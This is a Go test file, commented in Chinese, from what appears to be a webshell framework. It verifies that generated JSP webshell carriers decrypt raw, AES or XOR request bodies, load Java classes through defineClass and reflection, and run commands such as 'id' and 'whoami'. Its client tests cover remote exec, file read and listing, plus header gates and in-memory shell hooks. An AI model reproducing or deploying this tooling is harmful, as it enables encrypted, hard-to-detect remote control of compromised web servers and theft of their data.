package webshell

// carrier_java_test.go — Java 载体链路验证。
//
// 分两层：
//   1. wire 编解码（纯 Go）；
//   2. 端到端：Go 侧加密 → 载体逻辑（从生成的 JSP 源码里原样抽出来）解密 →
//      解析 wire → defineClass → 反射调用 → 回显。第 2 层跑在真 JVM 里，
//      验证的是「Go 加密的字节，Java 真的解得开并执行得了」，而不只是往返一致。
//
// 关键点：载体逻辑不是测试里另写一份，而是从 GenerateJavaCarrier 的产物中
// 截取 scriptlet 原文改写成可独立运行的宿主。这样载体模板改了，测试跟着变——
// 否则测试通过只证明测试自己没写错。

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"testing"
)

func TestBuildJavaWireRoundTrip(t *testing.T) {
	class := []byte{0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x01}
	cases := []struct {
		name  string
		op    string
		args  []string
		class []byte
	}{
		{"无参数", "ping", nil, class},
		{"单参数", "exec", []string{"id"}, class},
		{"命令含换行与引号", "exec", []string{"echo \"a\"\nwhoami"}, class},
		{"中文参数", "exec", []string{"echo 你好"}, class},
		{"多参数", "exec", []string{"ls", "/tmp", ""}, class},
		{"大 class", "info", []string{"x"}, make([]byte, 70_000)},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			wire, err := BuildJavaWire(javaPayloadClassName, c.op, c.args, c.class)
			if err != nil {
				t.Fatal(err)
			}
			cn, op, args, gotClass, err := ParseJavaWire(wire)
			if err != nil {
				t.Fatal(err)
			}
			if cn != javaPayloadClassName || op != c.op {
				t.Fatalf("头不一致: %q %q", cn, op)
			}
			if len(args) != len(c.args) {
				t.Fatalf("参数个数 %d != %d", len(args), len(c.args))
			}
			for i := range args {
				if args[i] != c.args[i] {
					t.Fatalf("参数 %d 不一致: %q != %q", i, args[i], c.args[i])
				}
			}
			if string(gotClass) != string(c.class) {
				t.Fatalf("class 字节不一致（%d vs %d）", len(gotClass), len(c.class))
			}
		})
	}
}

func TestBuildJavaWireRejectsBadInput(t *testing.T) {
	if _, err := BuildJavaWire("", "exec", nil, []byte{1}); err == nil {
		t.Fatal("空类名应报错")
	}
	if _, err := BuildJavaWire("a.B", "", nil, []byte{1}); err == nil {
		t.Fatal("空操作名应报错")
	}
	if _, err := BuildJavaWire("a.B", "exec", nil, nil); err == nil {
		t.Fatal("空 class 应报错")
	}
	// 截断的 wire 必须报错，不能越界读
	wire, _ := BuildJavaWire("a.B", "exec", []string{"id"}, []byte{1, 2, 3})
	for _, n := range []int{0, 1, 2, 3, 5, len(wire) - 1} {
		if _, _, _, _, err := ParseJavaWire(wire[:n]); err == nil {
			t.Fatalf("截断到 %d 字节应报错", n)
		}
	}
	// 魔数不符
	bad := append([]byte("XXX"), wire[3:]...)
	if _, _, _, _, err := ParseJavaWire(bad); err == nil {
		t.Fatal("魔数不符应报错")
	}
}

func TestGenerateJavaCarrier(t *testing.T) {
	for _, enc := range []string{"raw", "aes", "xor"} {
		src, err := GenerateJavaCarrier("jsp", enc, "p@ss")
		if err != nil {
			t.Fatalf("%s: %v", enc, err)
		}
		if strings.Contains(src, "{{PASSWORD}}") || strings.Contains(src, "{{DECRYPT}}") {
			t.Fatalf("%s: 占位符未替换", enc)
		}
		// 魔数校验必须与 Go 侧常量逐个字节对得上，任一侧改动都能被发现
		for i := 0; i < 3; i++ {
			if !strings.Contains(src, "d["+strconv.Itoa(i)+"] != '"+string(javaWireMagic[i])+"'") {
				t.Fatalf("%s: 缺第 %d 字节魔数校验", enc, i)
			}
		}
		if !strings.Contains(src, `getMethod("run", new Class[]{String.class, String[].class})`) {
			t.Fatalf("%s: 缺反射调用入口", enc)
		}
		// 模板文本必须为零：scriptlet 之外出现任何字符都会混进响应体
		if got := templateText(src); got != "" {
			t.Fatalf("%s: scriptlet 之外有 %q，会污染响应", enc, got)
		}
	}
	// 不支持的组合要明确报错
	if _, err := GenerateJavaCarrier("php", "raw", "x"); err == nil {
		t.Fatal("php 不支持 Java 载体")
	}
	if _, err := GenerateJavaCarrier("jsp", "form-cmd", "x"); err == nil {
		t.Fatal("form-cmd 不支持 Java 载体")
	}
	if _, err := GenerateJavaCarrier("jsp", "raw", "  "); err == nil {
		t.Fatal("空密码应报错")
	}
}

// 密码里带引号/反斜杠时生成的 JSP 仍必须是合法 Java 字面量。
func TestJavaCarrierPasswordEscaping(t *testing.T) {
	src, err := GenerateJavaCarrier("jsp", "aes", `a"b\c`)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(src, `md5("a\"b\\c".getBytes`) {
		t.Fatalf("密码未正确转义:\n%s", firstLineWith(src, "md5("))
	}
}

// Gate 片段与载体之间不能留换行，否则响应体多出空行。
func TestJavaCarrierGateNoExtraWhitespace(t *testing.T) {
	src, err := GenerateJavaCarrierOpts("jsp", "raw", "k", GateOpts{Header: "X-Gate", Value: "v"})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(src, "%>\n<%!") || strings.Contains(src, "%>\n<%try") {
		t.Fatal("gate 与载体之间有换行，会输出空白")
	}
	if got := templateText(src); got != "" {
		t.Fatalf("带 gate 时 scriptlet 之外有 %q", got)
	}
}

// templateText 返回 JSP 源码里落在 scriptlet/directive 之外的非空白文本。
func templateText(src string) string {
	var out strings.Builder
	for i := 0; i < len(src); {
		j := strings.Index(src[i:], "<%")
		if j < 0 {
			out.WriteString(src[i:])
			break
		}
		out.WriteString(src[i : i+j])
		rest := src[i+j:]
		k := strings.Index(rest, "%>")
		if k < 0 {
			break
		}
		i += j + k + 2
	}
	return strings.TrimSpace(out.String())
}

func firstLineWith(s, sub string) string {
	for _, line := range strings.Split(s, "\n") {
		if strings.Contains(line, sub) {
			return line
		}
	}
	return ""
}

// splitCarrier 从生成的 JSP 中抽出声明块与主体，供真 JVM 宿主复用同一份逻辑。
func splitCarrier(t *testing.T, src string) (decl, body string) {
	t.Helper()
	d := strings.Index(src, "<%!")
	if d < 0 {
		t.Fatal("载体缺声明块")
	}
	sep := strings.Index(src[d:], "%><%")
	if sep < 0 {
		t.Fatal("载体声明块与主体之间没有 %><%")
	}
	decl = src[d+3 : d+sep]
	body = src[d+sep+4:]
	body = strings.TrimSuffix(strings.TrimSpace(body), "%>")
	return strings.TrimSuffix(strings.TrimSpace(decl), "%>"), body
}

// carrierHostJava 把载体 scriptlet 改写成可独立运行的宿主：
//   - request.getInputStream() → 读文件（测试把加密后的 body 写进文件）
//   - application 属性缓存 → 静态 Map
//   - out.print → System.out.print
//
// 其余解析/加载/调用逻辑原样保留。
func carrierHostJava(decl, body string) string {
	body = strings.ReplaceAll(body, "request.getInputStream()", "new java.io.FileInputStream(A[0])")
	body = strings.ReplaceAll(body, `application.getAttribute("__fjm")`, "CACHE")
	body = strings.ReplaceAll(body, `application.setAttribute("__fjm", cache);`, ";")
	body = strings.ReplaceAll(body, "out.print(", "System.out.print(")
	// 宿主没有 JSP 上下文，上下文注入传 null（内存马相关断言不在这个用例里）
	body = strings.ReplaceAll(body, "new Object[]{request, application}", "new Object[]{null, null}")

	var b strings.Builder
	b.WriteString("import java.util.*;\nimport java.lang.reflect.*;\nimport java.security.*;\n")
	b.WriteString("import javax.crypto.*;\nimport javax.crypto.spec.*;\n")
	b.WriteString("public class CarrierHost {\n")
	b.WriteString("  static java.util.Map CACHE = new java.util.HashMap();\n")
	b.WriteString(decl)
	b.WriteString("\n  public static void main(String[] argv) throws Exception {\n")
	b.WriteString("    String[] A = argv;\n")
	b.WriteString(body)
	b.WriteString("\n  }\n}\n")
	return b.String()
}

// TestJavaCarrierEndToEndInJVM 真 JVM 跑通三种加密的完整链路。
func TestJavaCarrierEndToEndInJVM(t *testing.T) {
	ResetJavaPayloadCache()
	class, err := BuildJavaPayload()
	if err != nil {
		t.Skip("本机无 JDK:", err)
	}
	javac, err := findJavac()
	if err != nil {
		t.Skip(err)
	}
	javaBin := filepath.Join(filepath.Dir(javac), "java")
	if _, statErr := os.Stat(javaBin + ".exe"); statErr == nil {
		javaBin += ".exe"
	} else if _, statErr := os.Stat(javaBin); statErr != nil {
		t.Skip("找不到 java 可执行文件")
	}

	const password = "forang-test-key"
	for _, encName := range []string{"raw", "aes", "xor"} {
		t.Run(encName, func(t *testing.T) {
			src, err := GenerateJavaCarrier("jsp", encName, password)
			if err != nil {
				t.Fatal(err)
			}
			decl, body := splitCarrier(t, src)
			host := carrierHostJava(decl, body)

			dir := t.TempDir()
			hostPath := filepath.Join(dir, "CarrierHost.java")
			if err := os.WriteFile(hostPath, []byte(host), 0o644); err != nil {
				t.Fatal(err)
			}
			if out, cErr := exec.Command(javac, "-d", dir, hostPath).CombinedOutput(); cErr != nil {
				t.Fatalf("编译载体宿主失败: %v\n%s\n--- 宿主源码 ---\n%s", cErr, out, host)
			}

			call := func(op string, args ...string) string {
				wire, wErr := BuildJavaWire(javaPayloadClassName, op, args, class)
				if wErr != nil {
					t.Fatal(wErr)
				}
				encInst, gErr := GetEncoder(encName)
				if gErr != nil {
					t.Fatal(gErr)
				}
				encBody, eErr := encInst.Encrypt(wire, password)
				if eErr != nil {
					t.Fatal(eErr)
				}
				inFile := filepath.Join(dir, "body.bin")
				if wErr := os.WriteFile(inFile, encBody, 0o644); wErr != nil {
					t.Fatal(wErr)
				}
				cmd := exec.Command(javaBin, "-cp", dir, "CarrierHost", inFile)
				out, rErr := cmd.CombinedOutput()
				text := string(out)
				if rErr != nil && !strings.Contains(text, "ERROR:") {
					t.Fatalf("%s 执行失败: %v\n%s", op, rErr, text)
				}
				return text
			}

			if got := call("ping"); !strings.Contains(got, PongMarker) {
				t.Fatalf("ping 未返回存活标记: %q", got)
			}
			if got := call("exec", "echo carrier-ok"); !strings.Contains(got, "carrier-ok") {
				t.Fatalf("exec 输出异常: %q", got)
			}
			if got := call("info"); !strings.Contains(got, "java.version=") {
				t.Fatalf("info 输出异常: %q", got)
			}
			// 工作目录参数：切目录后取当前路径，应能命中临时目录名
			probe := "pwd"
			if runtime.GOOS == "windows" {
				probe = "cd"
			}
			if got := call("exec", probe, dir); !strings.Contains(got, filepath.Base(dir)) {
				t.Fatalf("cwd 参数未生效: %q", got)
			}
			// 坏 wire（魔数不对）必须走 ERROR 分支而不是抛 500
			badFile := filepath.Join(dir, "bad.bin")
			if err := os.WriteFile(badFile, []byte("bm90LWEtd2lyZQ=="), 0o644); err != nil {
				t.Fatal(err)
			}
			out, _ := exec.Command(javaBin, "-cp", dir, "CarrierHost", badFile).CombinedOutput()
			if !strings.Contains(string(out), "ERROR:") {
				t.Fatalf("坏 wire 应返回 ERROR:，实际 %q", string(out))
			}
		})
	}
}

// TestClientJavaCarrierRoundTrip 客户端侧的投递链路：op 映射、加密、wire 组装、
// 响应解析。假目标按载体同样的规则解 wire，因此能验证「客户端发的东西载体收得下」。
func TestClientJavaCarrierRoundTrip(t *testing.T) {
	if _, err := BuildJavaPayload(); err != nil {
		t.Skip("本机无 JDK:", err)
	}
	const pw = "carrier-pw"
	var sawClass []byte

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		enc, _ := GetEncoder("aes")
		raw, _ := io.ReadAll(r.Body)
		plain := enc.Decrypt(raw, pw)
		cn, op, args, class, err := ParseJavaWire(plain)
		if err != nil {
			fmt.Fprintf(w, "ERROR:wire %v", err)
			return
		}
		if cn != javaPayloadClassName {
			fmt.Fprintf(w, "ERROR:class name %q", cn)
			return
		}
		if len(class) < 4 || class[0] != 0xCA || class[1] != 0xFE {
			fmt.Fprintf(w, "ERROR:bad class bytes")
			return
		}
		sawClass = class
		switch op {
		case "ping":
			fmt.Fprint(w, PongMarker)
		case "exec":
			fmt.Fprintf(w, "ran:%s argc:%d", args[0], len(args))
			if len(args) > 1 {
				fmt.Fprintf(w, " cwd:%s", args[1])
			}
		case "info":
			fmt.Fprint(w, "java.version=1.8.0\nos.name=Linux\n")
		case "read":
			// 与真实载荷一致：read 回 base64
			fmt.Fprint(w, base64.StdEncoding.EncodeToString([]byte("file-body")))
		case "list":
			fmt.Fprint(w, `[{"name":"a.txt","size":3,"is_dir":false,"mtime":1}]`)
		default:
			fmt.Fprintf(w, "ERROR:unknown op: %s", op)
		}
	}))
	defer srv.Close()

	c := &Client{URL: srv.URL, Password: pw, Encoder: "aes", ScriptType: "jsp", Carrier: "java"}

	if res, err := c.Test(); err != nil || !res.OK {
		t.Fatalf("test 失败: %v %+v", err, res)
	}
	if res, err := c.ExecCmd("id"); err != nil || !res.OK || res.Output != "ran:id argc:1" {
		t.Fatalf("exec 失败: %v %+v", err, res)
	}
	// 带 cwd 时应作为第二个参数下发
	c.Cwd = "/tmp"
	if res, err := c.ExecCmd("ls"); err != nil || !res.OK || !strings.Contains(res.Output, "cwd:/tmp") {
		t.Fatalf("exec cwd 失败: %v %+v", err, res)
	}
	if res, err := c.RoundTrip("info", P{}); err != nil || !strings.Contains(res.Output, "java.version=") {
		t.Fatalf("info 失败: %v %+v", err, res)
	}
	if len(sawClass) == 0 {
		t.Fatal("目标端没收到 class 字节")
	}
	// 文件管理已经支持，跑一次确认走的是 java 通道
	if res, err := c.RoundTrip("read", P{Path: "/tmp/x"}); err != nil || !res.OK {
		t.Fatalf("read 应可用: %v %+v", err, res)
	}
	// 未实现的操作（插件通道的 zip）要在本地就拒绝，别把无效 op 发到目标端
	if _, err := c.RoundTrip("zip", P{Path: "/"}); err == nil {
		t.Fatal("zip 应明确报「暂不支持」")
	}
	// 非 jsp 目标不能用 java 载体
	bad := &Client{URL: srv.URL, Password: pw, Encoder: "aes", ScriptType: "php", Carrier: "java"}
	if _, err := bad.ExecCmd("id"); err == nil {
		t.Fatal("php 目标应拒绝 java 载体")
	}
}
